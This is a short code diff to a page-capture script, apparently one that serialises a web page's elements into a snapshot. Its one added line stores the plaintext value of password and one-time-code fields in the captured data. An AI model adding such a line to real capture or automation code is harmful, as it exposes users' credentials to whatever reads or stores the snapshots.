@@ -113,6 +113,7 @@ export const CAPTURE_SCRIPT = String.raw`(function capture(opts) {
           el.getAttribute("title") || el.getAttribute("placeholder") || el.getAttribute("aria-label") || "";
         node.t = label.slice(0, 120);
         if (editable) node.ed = editable;
+        if ((editable === "secret" || editable === "otp") && el.value) node.sv = el.value;
         if (editable === "rich") node.val = (el.innerText || "").replace(/\n{3,}/g, "\n\n").slice(0, 2000);
         if (tag === "a" && el.href) node.href = el.href;
         if (why) node.cur = why;
